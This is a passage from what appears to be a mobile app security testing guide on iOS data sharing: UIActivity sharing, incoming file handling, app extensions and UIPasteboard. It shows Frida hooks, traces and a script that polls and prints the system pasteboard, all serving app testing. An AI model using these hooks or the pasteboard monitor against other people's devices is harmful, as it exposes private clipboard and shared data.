  \OperatorTok{\}} \ControlFlowTok{catch}\NormalTok{ (e) }\OperatorTok{\{}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\VariableTok{retval}\NormalTok{.}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
  \OperatorTok{\}}
\OperatorTok{\};}
\end{Highlighting}
\end{Shaded}

You can store this as a JavaScript file,
e.g.~\texttt{inspect\_send\_activity\_data.js} and load it like this:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{frida}\NormalTok{ {-}U Telegram {-}l inspect\_send\_activity\_data.js}
\end{Highlighting}
\end{Shaded}

Now observe the output when you first share a picture:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\OperatorTok{*}\NormalTok{] initWithActivityItems}\OperatorTok{:}\NormalTok{applicationActivities}\OperatorTok{:}\NormalTok{ @ }\BaseNTok{0x18c130c07}
\NormalTok{initWithActivityItems}\OperatorTok{:}\NormalTok{ (}
    \StringTok{"<UIImage: 0x1c4aa0b40> size \{571, 264\} orientation 0 scale 1.000000"}
\NormalTok{)}
\NormalTok{applicationActivities}\OperatorTok{:}\NormalTok{ nil}
\NormalTok{RET @ }\BaseNTok{0x13cb2b800}\OperatorTok{:}
\OperatorTok{<}\NormalTok{UIActivityViewController}\OperatorTok{:} \BaseNTok{0x13cb2b800}\OperatorTok{>}

\NormalTok{[}\OperatorTok{*}\NormalTok{] excludedActivityTypes @ }\BaseNTok{0x18c0f8429}
\NormalTok{RET @ }\BaseNTok{0x0}\OperatorTok{:}
\NormalTok{nil}
\end{Highlighting}
\end{Shaded}

and then a text file:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\OperatorTok{*}\NormalTok{] initWithActivityItems}\OperatorTok{:}\NormalTok{applicationActivities}\OperatorTok{:}\NormalTok{ @ }\BaseNTok{0x18c130c07}
\NormalTok{initWithActivityItems}\OperatorTok{:}\NormalTok{ (}
    \StringTok{"<QLActivityItemProvider: 0x1c4a30140>"}\OperatorTok{,}
    \StringTok{"<UIPrintInfo: 0x1c0699a50>"}
\NormalTok{)}
\NormalTok{applicationActivities}\OperatorTok{:}\NormalTok{ (}
\NormalTok{)}
\NormalTok{RET @ }\BaseNTok{0x13c4bdc00}\OperatorTok{:}
\OperatorTok{<}\NormalTok{\_UIDICActivityViewController}\OperatorTok{:} \BaseNTok{0x13c4bdc00}\OperatorTok{>}

\NormalTok{[}\OperatorTok{*}\NormalTok{] excludedActivityTypes @ }\BaseNTok{0x18c0f8429}
\NormalTok{RET @ }\BaseNTok{0x1c001b1d0}\OperatorTok{:}
\NormalTok{(}
    \StringTok{"com.apple.UIKit.activity.MarkupAsPDF"}
\NormalTok{)}
\end{Highlighting}
\end{Shaded}

You can see that:

\begin{itemize}
\tightlist
\item
  For the picture, the activity item is a \texttt{UIImage} and there are
  no excluded activities.
\item
  For the text file there are two different activity items and
  ``com.apple.UIKit.activity.MarkupAsPDF'' is excluded.
\end{itemize}

In the previous example, there were no custom
\texttt{applicationActivities} and only one excluded activity. However,
to better illustrate what you can expect from other apps we have shared
a picture using another app, here you can see a bunch of application
activities and excluded activities (output was edited to hide the name
of the originating app):

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\OperatorTok{*}\NormalTok{] initWithActivityItems}\OperatorTok{:}\NormalTok{applicationActivities}\OperatorTok{:}\NormalTok{ @ }\BaseNTok{0x18c130c07}
\NormalTok{initWithActivityItems}\OperatorTok{:}\NormalTok{ (}
    \StringTok{"<SomeActivityItemProvider: 0x1c04bd580>"}
\NormalTok{)}
\NormalTok{applicationActivities}\OperatorTok{:}\NormalTok{ (}
    \StringTok{"<SomeActionItemActivityAdapter: 0x141de83b0>"}\OperatorTok{,}
    \StringTok{"<SomeActionItemActivityAdapter: 0x147971cf0>"}\OperatorTok{,}
    \StringTok{"<SomeOpenInSafariActivity: 0x1479f0030>"}\OperatorTok{,}
    \StringTok{"<SomeOpenInChromeActivity: 0x1c0c8a500>"}
\NormalTok{)}
\NormalTok{RET @ }\BaseNTok{0x142138a00}\OperatorTok{:}
\OperatorTok{<}\NormalTok{SomeActivityViewController}\OperatorTok{:} \BaseNTok{0x142138a00}\OperatorTok{>}

\NormalTok{[}\OperatorTok{*}\NormalTok{] excludedActivityTypes @ }\BaseNTok{0x18c0f8429}
\NormalTok{RET @ }\BaseNTok{0x14797c3e0}\OperatorTok{:}
\NormalTok{(}
    \StringTok{"com.apple.UIKit.activity.Print"}\OperatorTok{,}
    \StringTok{"com.apple.UIKit.activity.AssignToContact"}\OperatorTok{,}
    \StringTok{"com.apple.UIKit.activity.SaveToCameraRoll"}\OperatorTok{,}
    \StringTok{"com.apple.UIKit.activity.CopyToPasteboard"}\OperatorTok{,}
\NormalTok{)}
\end{Highlighting}
\end{Shaded}

Receiving Items

After performing the static analysis you would know the \emph{document
types that the app can open} and \emph{if it declares any custom
document types} and (part of) the methods involved. You can use this now
to test the receiving part:

\begin{itemize}
\tightlist
\item
  \emph{Share} a file with the app from another app or send it via
  AirDrop or e-mail. Choose the file so that it will trigger the ``Open
  with\ldots{}'' dialogue (that is, there is no default app that will
  open the file, a PDF for example).
\item
  Hook \texttt{application:openURL:options:} and any other methods that
  were identified in a previous static analysis.
\item
  Observe the app behavior.
\item
  In addition, you could send specific malformed files and/or use a
  fuzzing technique.
\end{itemize}

To illustrate this with an example we have chosen the same real-world
file manager app from the static analysis section and followed these
steps:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  Send a PDF file from another Apple device (e.g.~a MacBook) via
  Airdrop.
\item
  Wait for the \textbf{AirDrop} popup to appear and click on
  \textbf{Accept}.
\item
  As there is no default app that will open the file, it switches to the
  \textbf{Open with\ldots{}} popup. There, we can select the app that
  will open our file. The next screenshot shows this (we have modified
  the display name using Frida to conceal the app's real name):

  \begin{figure}
  \centering
  \includegraphics[width=2.60417in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/bd8dc141de1388af244f55cf297a00d01629c14f.png}
  \caption{Images/Chapters/0x06h/airdrop\_openwith.png}
  \end{figure}
\item
  After selecting \textbf{SomeFileManager} we can see the following:

\begin{verbatim}
(0x1c4077000)  -[AppDelegate application:openURL:options:]
application: <UIApplication: 0x101c00950>
openURL: file:///var/mobile/Library/Application%20Support
                    /Containers/com.some.filemanager/Documents/Inbox/OWASP_MASVS.pdf
options: {
    UIApplicationOpenURLOptionsAnnotationKey =     {
        LSMoveDocumentOnOpen = 1;
    };
    UIApplicationOpenURLOptionsOpenInPlaceKey = 0;
    UIApplicationOpenURLOptionsSourceApplicationKey = "com.apple.sharingd";
    "_UIApplicationOpenURLOptionsSourceProcessHandleKey" = "<FBSProcessHandle: 0x1c3a63140;
                                                                sharingd:605; valid: YES>";
}
0x18c7930d8 UIKit!__58-[UIApplication _applicationOpenURLAction:payload:origin:]_block_invoke
...
0x1857cdc34 FrontBoardServices!-[FBSSerialQueue _performNextFromRunLoopSource]
RET: 0x1
\end{verbatim}
\end{enumerate}

As you can see, the sending application is \texttt{com.apple.sharingd}
and the URL's scheme is \texttt{file://}. Note that once we select the
app that should open the file, the system already moved the file to the
corresponding destination, that is to the app's Inbox. The apps are then
responsible for deleting the files inside their Inboxes. This app, for
example, moves the file to \texttt{/var/mobile/Documents/} and removes
it from the Inbox.

\begin{verbatim}
(0x1c002c760)  -[XXFileManager moveItemAtPath:toPath:error:]
moveItemAtPath: /var/mobile/Library/Application Support/Containers
                            /com.some.filemanager/Documents/Inbox/OWASP_MASVS.pdf
toPath: /var/mobile/Documents/OWASP_MASVS (1).pdf
error: 0x16f095bf8
0x100f24e90 SomeFileManager!-[AppDelegate __handleOpenURL:]
0x100f25198 SomeFileManager!-[AppDelegate application:openURL:options:]
0x18c7930d8 UIKit!__58-[UIApplication _applicationOpenURLAction:payload:origin:]_block_invoke
...
0x1857cd9f4 FrontBoardServices!__FBSSERIALQUEUE_IS_CALLING_OUT_TO_A_BLOCK__
RET: 0x1
\end{verbatim}

If you look at the stack trace, you can see how
\texttt{application:openURL:options:} called
\texttt{\_\_handleOpenURL:}, which called
\texttt{moveItemAtPath:toPath:error:}. Notice that we have now this
information without having the source code for the target app. The first
thing that we had to do was clear: hook
\texttt{application:openURL:options:}. Regarding the rest, we had to
think a little bit and come up with methods that we could start tracing
and are related to the file manager, for example, all methods containing
the strings ``copy'', ``move'', ``remove'', etc. until we have found
that the one being called was \texttt{moveItemAtPath:toPath:error:}.

A final thing worth noticing here is that this way of handling incoming
files is the same for custom URL schemes. Please refer to the
``\protect\hyperlink{testing-custom-url-schemes-mstg-platform-3}{Testing
Custom URL Schemes}'' section for more information.

\hypertarget{app-extensions}{%
\paragraph{App Extensions}\label{app-extensions}}

\hypertarget{overview-62}{%
\subparagraph{Overview}\label{overview-62}}

What are app extensions

Together with iOS 8, Apple introduced App Extensions. According to
\href{https://developer.apple.com/library/archive/documentation/General/Conceptual/ExtensibilityPG/index.html\#//apple_ref/doc/uid/TP40014214-CH20-SW1}{Apple
App Extension Programming Guide}, app extensions let apps offer custom
functionality and content to users while they're interacting with other
apps or the system. In order to do this, they implement specific, well
scoped tasks like, for example, define what happens after the user
clicks on the ``Share'' button and selects some app or action, provide
the content for a Today widget or enable a custom keyboard.

Depending on the task, the app extension will have a particular type
(and only one), the so-called \emph{extension points}. Some notable ones
are:

\begin{itemize}
\tightlist
\item
  Custom Keyboard: replaces the iOS system keyboard with a custom
  keyboard for use in all apps.
\item
  Share: post to a sharing website or share content with others.
\item
  Today: also called widgets, they offer content or perform quick tasks
  in the Today view of Notification Center.
\end{itemize}

How do app extensions interact with other apps

There are three important elements here:

\begin{itemize}
\tightlist
\item
  App extension: is the one bundled inside a containing app. Host apps
  interact with it.
\item
  Host app: is the (third-party) app that triggers the app extension of
  another app.
\item
  Containing app: is the app that contains the app extension bundled
  into it.
\end{itemize}

For example, the user selects text in the \emph{host app}, clicks on the
``Share'' button and selects one ``app'' or action from the list. This
triggers the \emph{app extension} of the \emph{containing app}. The app
extension displays its view within the context of the host app and uses
the items provided by the host app, the selected text in this case, to
perform a specific task (post it on a social network, for example). See
this picture from the
\href{https://developer.apple.com/library/archive/documentation/General/Conceptual/ExtensibilityPG/ExtensionOverview.html\#//apple_ref/doc/uid/TP40014214-CH2-SW13}{Apple
App Extension Programming Guide} which pretty good summarizes this:

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/5473929e7bf77cdcc33fa8e73d8852d5453b9fa9.png}
\caption{Images/Chapters/0x06h/app\_extensions\_communication.png}
\end{figure}

Security Considerations

From the security point of view it is important to note that:

\begin{itemize}
\tightlist
\item
  An app extension does never communicate directly with its containing
  app (typically, it isn't even running while the contained app
  extension is running).
\item
  An app extension and the host app communicate via inter-process
  communication.
\item
  An app extension's containing app and the host app don't communicate
  at all.
\item
  A Today widget (and no other app extension type) can ask the system to
  open its containing app by calling the
  \texttt{openURL:completionHandler:} method of the
  \texttt{NSExtensionContext} class.
\item
  Any app extension and its containing app can access shared data in a
  privately defined shared container.
\end{itemize}

In addition:

\begin{itemize}
\tightlist
\item
  App extensions cannot access some APIs, for example, HealthKit.
\item
  They cannot receive data using AirDrop but do can send data.
\item
  No long-running background tasks are allowed but uploads or downloads
  can be initiated.
\item
  App extensions cannot access the camera or microphone on an iOS device
  (except for iMessage app extensions).
\end{itemize}

\hypertarget{static-analysis-69}{%
\subparagraph{Static Analysis}\label{static-analysis-69}}

The static analysis will take care of:

\begin{itemize}
\tightlist
\item
  Verifying if the app contains app extensions
\item
  Determining the supported data types
\item
  Checking data sharing with the containing app
\item
  Verifying if the app restricts the use of app extensions
\end{itemize}

Verifying if the App Contains App Extensions

If you have the original source code you can search for all occurrences
of \texttt{NSExtensionPointIdentifier} with Xcode (cmd+shift+f) or take
a look into ``Build Phases / Embed App extensions'':

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/557a97dedf920b66a40f2e92cd9f0010948caa4d.png}
\caption{Images/Chapters/0x06h/xcode\_embed\_app\_extensions.png}
\end{figure}

There you can find the names of all embedded app extensions followed by
\texttt{.appex}, now you can navigate to the individual app extensions
in the project.

If not having the original source code:

Grep for \texttt{NSExtensionPointIdentifier} among all files inside the
app bundle (IPA or installed app):

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\FunctionTok{grep}\NormalTok{ {-}nr NSExtensionPointIdentifier Payload/Telegram\textbackslash{} X.app/}
\ExtensionTok{Binary}\NormalTok{ file Payload/Telegram X.app//PlugIns/SiriIntents.appex/Info.plist matches}
\ExtensionTok{Binary}\NormalTok{ file Payload/Telegram X.app//PlugIns/Share.appex/Info.plist matches}
\ExtensionTok{Binary}\NormalTok{ file Payload/Telegram X.app//PlugIns/NotificationContent.appex/Info.plist matches}
\ExtensionTok{Binary}\NormalTok{ file Payload/Telegram X.app//PlugIns/Widget.appex/Info.plist matches}
\ExtensionTok{Binary}\NormalTok{ file Payload/Telegram X.app//Watch/Watch.app/PlugIns/Watch Extension.appex/Info.plist matches}
\end{Highlighting}
\end{Shaded}

You can also access per SSH, find the app bundle and list all inside
PlugIns (they are placed there by default) or do it with objection:

\begin{verbatim}
ph.telegra.Telegraph on (iPhone: 11.1.2) [usb] # cd PlugIns
    /var/containers/Bundle/Application/15E6A58F-1CA7-44A4-A9E0-6CA85B65FA35/
    Telegram X.app/PlugIns

ph.telegra.Telegraph on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    Read    Write     Name
------------  -------  ------------------  ------  -------   -------------------------
Directory         493  None                True    False     NotificationContent.appex
Directory         493  None                True    False     Widget.appex
Directory         493  None                True    False     Share.appex
Directory         493  None                True    False     SiriIntents.appex
\end{verbatim}

We can see now the same four app extensions that we saw in Xcode before.

Determining the Supported Data Types

This is important for data being shared with host apps (e.g.~via Share
or Action Extensions). When the user selects some data type in a host
app and it matches the data types define here, the host app will offer
the extension. It is worth noticing the difference between this and data
sharing via \texttt{UIActivity} where we had to define the document
types, also using UTIs. An app does not need to have an extension for
that. It is possible to share data using only \texttt{UIActivity}.

Inspect the app extension's \texttt{Info.plist} file and search for
\texttt{NSExtensionActivationRule}. That key specifies the data being
supported as well as e.g.~maximum of items supported. For example:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{<key>}\NormalTok{NSExtensionAttributes}\KeywordTok{</key>}
    \KeywordTok{<dict>}
        \KeywordTok{<key>}\NormalTok{NSExtensionActivationRule}\KeywordTok{</key>}
        \KeywordTok{<dict>}
            \KeywordTok{<key>}\NormalTok{NSExtensionActivationSupportsImageWithMaxCount}\KeywordTok{</key>}
            \KeywordTok{<integer>}\NormalTok{10}\KeywordTok{</integer>}
            \KeywordTok{<key>}\NormalTok{NSExtensionActivationSupportsMovieWithMaxCount}\KeywordTok{</key>}
            \KeywordTok{<integer>}\NormalTok{1}\KeywordTok{</integer>}
            \KeywordTok{<key>}\NormalTok{NSExtensionActivationSupportsWebURLWithMaxCount}\KeywordTok{</key>}
            \KeywordTok{<integer>}\NormalTok{1}\KeywordTok{</integer>}
        \KeywordTok{</dict>}
    \KeywordTok{</dict>}
\end{Highlighting}
\end{Shaded}

Only the data types present here and not having \texttt{0} as
\texttt{MaxCount} will be supported. However, more complex filtering is
possible by using a so-called predicate string that will evaluate the
UTIs given. Please refer to the
\href{https://developer.apple.com/library/archive/documentation/General/Conceptual/ExtensibilityPG/ExtensionScenarios.html\#//apple_ref/doc/uid/TP40014214-CH21-SW8}{Apple
App Extension Programming Guide} for more detailed information about
this.

Checking Data Sharing with the Containing App

Remember that app extensions and their containing apps do not have
direct access to each other's containers. However, data sharing can be
enabled. This is done via
\href{https://developer.apple.com/library/archive/documentation/Miscellaneous/Reference/EntitlementKeyReference/Chapters/EnablingAppSandbox.html\#//apple_ref/doc/uid/TP40011195-CH4-SW19}{``App
Groups''} and the
\href{https://developer.apple.com/documentation/foundation/nsuserdefaults}{\texttt{NSUserDefaults}}
API. See this figure from
\href{https://developer.apple.com/library/archive/documentation/General/Conceptual/ExtensibilityPG/ExtensionScenarios.html\#//apple_ref/doc/uid/TP40014214-CH21-SW11}{Apple
App Extension Programming Guide}:

\begin{figure}
\centering
\includegraphics[width=5.20833in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/58e3d56af1f679e03a8f5cb31471a7c09d6e23c2.png}
\caption{Images/Chapters/0x06h/app\_extensions\_container\_restrictions.png}
\end{figure}

As also mentioned in the guide, the app must set up a shared container
if the app extension uses the \texttt{NSURLSession} class to perform a
background upload or download, so that both the extension and its
containing app can access the transferred data.

Verifying if the App Restricts the Use of App Extensions

It is possible to reject a specific type of app extension by using the
method
\href{https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623122-application?language=objc}{\texttt{application:shouldAllowExtensionPointIdentifier:}}.
However, it is currently only possible for ``custom keyboard'' app
extensions (and should be verified when testing apps handling sensitive
data via the keyboard like e.g.~banking apps).

\hypertarget{dynamic-analysis-65}{%
\subparagraph{Dynamic Analysis}\label{dynamic-analysis-65}}

For the dynamic analysis we can do the following to gain knowledge
without having the source code:

\begin{itemize}
\tightlist
\item
  Inspecting the items being shared
\item
  Identifying the app extensions involved
\end{itemize}

Inspecting the Items Being Shared

For this we should hook \texttt{NSExtensionContext\ -\ inputItems} in
the data originating app.

Following the previous example of Telegram we will now use the ``Share''
button on a text file (that was received from a chat) to create a note
in the Notes app with it:

\begin{figure}
\centering
\includegraphics[width=2.60417in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/73067a4b013a3b6059ad9d5d1dcc72d0079ba9b8.png}
\caption{Images/Chapters/0x06h/telegram\_share\_extension.png}
\end{figure}

If we run a trace, we'd see the following output:

\begin{verbatim}
(0x1c06bb420) NSExtensionContext - inputItems
0x18284355c Foundation!-[NSExtension _itemProviderForPayload:extensionContext:]
0x1828447a4 Foundation!-[NSExtension _loadItemForPayload:contextIdentifier:completionHandler:]
0x182973224 Foundation!__NSXPCCONNECTION_IS_CALLING_OUT_TO_EXPORTED_OBJECT_S3__
0x182971968 Foundation!-[NSXPCConnection _decodeAndInvokeMessageWithEvent:flags:]
0x182748830 Foundation!message_handler
0x181ac27d0 libxpc.dylib!_xpc_connection_call_event_handler
0x181ac0168 libxpc.dylib!_xpc_connection_mach_event
...
RET: (
"<NSExtensionItem: 0x1c420a540> - userInfo:
{
    NSExtensionItemAttachmentsKey =     (
    "<NSItemProvider: 0x1c46b30e0> {types = (\n \"public.plain-text\",\n \"public.file-url\"\n)}"
    );
}"
)
\end{verbatim}

Here we can observe that:

\begin{itemize}
\tightlist
\item
  This occurred under-the-hood via XPC, concretely it is implemented via
  a \texttt{NSXPCConnection} that uses the \texttt{libxpc.dylib}
  Framework.
\item
  The UTIs included in the \texttt{NSItemProvider} are
  \texttt{public.plain-text} and \texttt{public.file-url}, the latter
  being included in \texttt{NSExtensionActivationRule} from the
  \href{https://github.com/TelegramMessenger/Telegram-iOS/blob/master/Telegram/Share/Info.plist}{\texttt{Info.plist}
  of the ``Share Extension'' of Telegram}.
\end{itemize}

Identifying the App Extensions Involved

You can also find out which app extension is taking care of your the
requests and responses by hooking \texttt{NSExtension\ -\ \_plugIn}:

We run the same example again:

\begin{verbatim}
(0x1c0370200) NSExtension - _plugIn
RET: <PKPlugin: 0x1163637f0 ph.telegra.Telegraph.Share(5.3) 5B6DE177-F09B-47DA-90CD-34D73121C785
1(2) /private/var/containers/Bundle/Application/15E6A58F-1CA7-44A4-A9E0-6CA85B65FA35
/Telegram X.app/PlugIns/Share.appex>

(0x1c0372300)  -[NSExtension _plugIn]
RET: <PKPlugin: 0x10bff7910 com.apple.mobilenotes.SharingExtension(1.5) 73E4F137-5184-4459-A70A-83
F90A1414DC 1(2) /private/var/containers/Bundle/Application/5E267B56-F104-41D0-835B-F1DAB9AE076D
/MobileNotes.app/PlugIns/com.apple.mobilenotes.SharingExtension.appex>
\end{verbatim}

As you can see there are two app extensions involved:

\begin{itemize}
\tightlist
\item
  \texttt{Share.appex} is sending the text file
  (\texttt{public.plain-text} and \texttt{public.file-url}).
\item
  \texttt{com.apple.mobilenotes.SharingExtension.appex} which is
  receiving and will process the text file.
\end{itemize}

If you want to learn more about what's happening under-the-hood in terms
of XPC, we recommend to take a look at the internal calls from
``libxpc.dylib''. For example you can use
\href{https://www.frida.re/docs/frida-trace/}{\texttt{frida-trace}} and
then dig deeper into the methods that you find more interesting by
extending the automatically generated stubs.

\hypertarget{uipasteboard}{%
\paragraph{UIPasteboard}\label{uipasteboard}}

\hypertarget{overview-63}{%
\subparagraph{Overview}\label{overview-63}}

The
\href{https://developer.apple.com/documentation/uikit/uipasteboard}{\texttt{UIPasteboard}}
enables sharing data within an app, and from an app to other apps. There
are two kinds of pasteboards:

\begin{itemize}
\tightlist
\item
  \textbf{systemwide general pasteboard}: for sharing data with any app.
  Persistent by default across device restarts and app uninstalls (since
  iOS 10).
\item
  \textbf{custom / named pasteboards}: for sharing data with another app
  (having the same team ID as the app to share from) or with the app
  itself (they are only available in the process that creates them).
  Non-persistent by default (since iOS 10), that is, they exist only
  until the owning (creating) app quits.
\end{itemize}

Some security considerations:

\begin{itemize}
\tightlist
\item
  Users cannot grant or deny permission for apps to read the pasteboard.
\item
  Since iOS 9, apps
  \href{https://forums.developer.apple.com/thread/13760}{cannot access
  the pasteboard while in background}, this mitigates background
  pasteboard monitoring. However, if the \emph{malicious} app is brought
  to foreground again and the data remains in the pasteboard, it will be
  able to retrieve it programmatically without the knowledge nor the
  consent of the user.
\item
  \href{https://developer.apple.com/documentation/uikit/uipasteboard?language=objc}{Apple
  warns about persistent named pasteboards} and discourages their use.
  Instead, shared containers should be used.
\item
  Starting in iOS 10 there is a new Handoff feature called Universal
  Clipboard that is enabled by default. It allows the general pasteboard
  contents to automatically transfer between devices. This feature can
  be disabled if the developer chooses to do so and it is also possible
  to set an expiration time and date for copied data.
\end{itemize}

\hypertarget{static-analysis-70}{%
\subparagraph{Static Analysis}\label{static-analysis-70}}

The \textbf{systemwide general pasteboard} can be obtained by using
\href{https://developer.apple.com/documentation/uikit/uipasteboard/1622106-generalpasteboard?language=objc}{\texttt{generalPasteboard}},
search the source code or the compiled binary for this method. Using the
systemwide general pasteboard should be avoided when dealing with
sensitive data.

\textbf{Custom pasteboards} can be created with
\href{https://developer.apple.com/documentation/uikit/uipasteboard/1622074-pasteboardwithname?language=objc}{\texttt{pasteboardWithName:create:}}
or
\href{https://developer.apple.com/documentation/uikit/uipasteboard/1622087-pasteboardwithuniquename?language=objc}{\texttt{pasteboardWithUniqueName}}.
Verify if custom pasteboards are set to be persistent as this is
deprecated since iOS 10. A shared container should be used instead.

In addition, the following can be inspected:

\begin{itemize}
\tightlist
\item
  Check if pasteboards are being removed with
  \href{https://developer.apple.com/documentation/uikit/uipasteboard/1622072-removepasteboardwithname?language=objc}{\texttt{removePasteboardWithName:}},
  which invalidates an app pasteboard, freeing up all resources used by
  it (no effect for the general pasteboard).
\item
  Check if there are excluded pasteboards, there should be a call to
  \texttt{setItems:options:} with the
  \texttt{UIPasteboardOptionLocalOnly} option.
\item
  Check if there are expiring pasteboards, there should be a call to
  \texttt{setItems:options:} with the
  \texttt{UIPasteboardOptionExpirationDate} option.
\item
  Check if the app swipes the pasteboard items when going to background
  or when terminating. This is done by some password manager apps trying
  to restrict sensitive data exposure.
\end{itemize}

\hypertarget{dynamic-analysis-66}{%
\subparagraph{Dynamic Analysis}\label{dynamic-analysis-66}}

Detect Pasteboard Usage

Hook or trace the following:

\begin{itemize}
\tightlist
\item
  \texttt{generalPasteboard} for the system-wide general pasteboard.
\item
  \texttt{pasteboardWithName:create:} and
  \texttt{pasteboardWithUniqueName} for custom pasteboards.
\end{itemize}

Detect Persistent Pasteboard Usage

Hook or trace the deprecated
\href{https://developer.apple.com/documentation/uikit/uipasteboard/1622096-setpersistent?language=objc}{\texttt{setPersistent:}}
method and verify if it's being called.

Monitoring and Inspecting Pasteboard Items

When monitoring the pasteboards, there is several details that may be
dynamically retrieved:

\begin{itemize}
\tightlist
\item
  Obtain pasteboard name by hooking \texttt{pasteboardWithName:create:}
  and inspecting its input parameters or
  \texttt{pasteboardWithUniqueName} and inspecting its return value.
\item
  Get the first available pasteboard item: e.g.~for strings use
  \texttt{string} method. Or use any of the other methods for the
  \href{https://developer.apple.com/documentation/uikit/uipasteboard?language=objc\#1654275}{standard
  data types}.
\item
  Get the number of items with \texttt{numberOfItems}.
\item
  Check for existence of standard data types with the
  \href{https://developer.apple.com/documentation/uikit/uipasteboard?language=objc\#2107142}{convenience
  methods}, e.g.~\texttt{hasImages}, \texttt{hasStrings},
  \texttt{hasURLs} (starting in iOS 10).
\item
  Check for other data types (typically UTIs) with
  \href{https://developer.apple.com/documentation/uikit/uipasteboard/1622100-containspasteboardtypes?language=objc}{\texttt{containsPasteboardTypes:inItemSet:}}.
  You may inspect for more concrete data types like, for example an
  picture as public.png and public.tiff
  (\href{https://developer.apple.com/documentation/mobilecoreservices/uttype?language=objc}{UTIs})
  or for custom data such as com.mycompany.myapp.mytype. Remember that,
  in this case, only those apps that \emph{declare knowledge} of the
  type are able to understand the data written to the pasteboard. This
  is the same as we have seen in the
  ``\protect\hyperlink{uiactivity-sharing}{UIActivity Sharing}''
  section. Retrieve them using
  \href{https://developer.apple.com/documentation/uikit/uipasteboard/1622071-itemsetwithpasteboardtypes?language=objc}{\texttt{itemSetWithPasteboardTypes:}}
  and setting the corresponding UTIs.
\item
  Check for excluded or expiring items by hooking
  \texttt{setItems:options:} and inspecting its options for
  \texttt{UIPasteboardOptionLocalOnly} or
  \texttt{UIPasteboardOptionExpirationDate}.
\end{itemize}

If only looking for strings you may want to use objection's command
\texttt{ios\ pasteboard\ monitor}:

\begin{quote}
Hooks into the iOS UIPasteboard class and polls the generalPasteboard
every 5 seconds for data. If new data is found, different from the
previous poll, that data will be dumped to screen.
\end{quote}

You may also build your own pasteboard monitor that monitors specific
information as seen above.

For example, this script (inspired from the script behind
\href{https://github.com/sensepost/objection/blob/b39ee53b5ba2e9a271797d2f3931d79c46dccfdb/agent/src/ios/pasteboard.ts}{objection's
pasteboard monitor}) reads the pasteboard items every 5 seconds, if
there's something new it will print it:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{const}\NormalTok{ UIPasteboard }\OperatorTok{=} \VariableTok{ObjC}\NormalTok{.}\VariableTok{classes}\NormalTok{.}\AttributeTok{UIPasteboard}\OperatorTok{;}
    \KeywordTok{const}\NormalTok{ Pasteboard }\OperatorTok{=} \VariableTok{UIPasteboard}\NormalTok{.}\AttributeTok{generalPasteboard}\NormalTok{()}\OperatorTok{;}
    \KeywordTok{var}\NormalTok{ items }\OperatorTok{=} \StringTok{""}\OperatorTok{;}
    \KeywordTok{var}\NormalTok{ count }\OperatorTok{=} \VariableTok{Pasteboard}\NormalTok{.}\AttributeTok{changeCount}\NormalTok{().}\AttributeTok{toString}\NormalTok{()}\OperatorTok{;}

\AttributeTok{setInterval}\NormalTok{(}\KeywordTok{function}\NormalTok{ () }\OperatorTok{\{}
      \KeywordTok{const}\NormalTok{ currentCount }\OperatorTok{=} \VariableTok{Pasteboard}\NormalTok{.}\AttributeTok{changeCount}\NormalTok{().}\AttributeTok{toString}\NormalTok{()}\OperatorTok{;}
      \KeywordTok{const}\NormalTok{ currentItems }\OperatorTok{=} \VariableTok{Pasteboard}\NormalTok{.}\AttributeTok{items}\NormalTok{().}\AttributeTok{toString}\NormalTok{()}\OperatorTok{;}

      \ControlFlowTok{if}\NormalTok{ (currentCount }\OperatorTok{===}\NormalTok{ count) }\OperatorTok{\{} \ControlFlowTok{return}\OperatorTok{;} \OperatorTok{\}}

\NormalTok{      items }\OperatorTok{=}\NormalTok{ currentItems}\OperatorTok{;}
\NormalTok{      count }\OperatorTok{=}\NormalTok{ currentCount}\OperatorTok{;}

      \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}[* Pasteboard changed] count: \textquotesingle{}} \OperatorTok{+}\NormalTok{ count }\OperatorTok{+}
      \StringTok{\textquotesingle{} hasStrings: \textquotesingle{}} \OperatorTok{+} \VariableTok{Pasteboard}\NormalTok{.}\AttributeTok{hasStrings}\NormalTok{().}\AttributeTok{toString}\NormalTok{() }\OperatorTok{+}
      \StringTok{\textquotesingle{} hasURLs: \textquotesingle{}} \OperatorTok{+} \VariableTok{Pasteboard}\NormalTok{.}\AttributeTok{hasURLs}\NormalTok{().}\AttributeTok{toString}\NormalTok{() }\OperatorTok{+}
      \StringTok{\textquotesingle{} hasImages: \textquotesingle{}} \OperatorTok{+} \VariableTok{Pasteboard}\NormalTok{.}\AttributeTok{hasImages}\NormalTok{().}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
      \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(items)}\OperatorTok{;}

    \OperatorTok{\},} \DecValTok{1000} \OperatorTok{*} \DecValTok{5}\NormalTok{)}\OperatorTok{;}
\end{Highlighting}
\end{Shaded}

In the output we can see the following:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{[}\ExtensionTok{*}\NormalTok{ Pasteboard changed] count: 64 hasStrings: true hasURLs: false hasImages: false}
\KeywordTok{(}
    \KeywordTok{\{}
        \StringTok{"public.utf8{-}plain{-}text"}\NormalTok{ = }\ExtensionTok{hola}\KeywordTok{;}
    \KeywordTok{\}}
\KeywordTok{)}
\NormalTok{[}\ExtensionTok{*}\NormalTok{ Pasteboard changed] count: 65 hasStrings: true hasURLs: true hasImages: false}
\KeywordTok{(}
    \KeywordTok{\{}
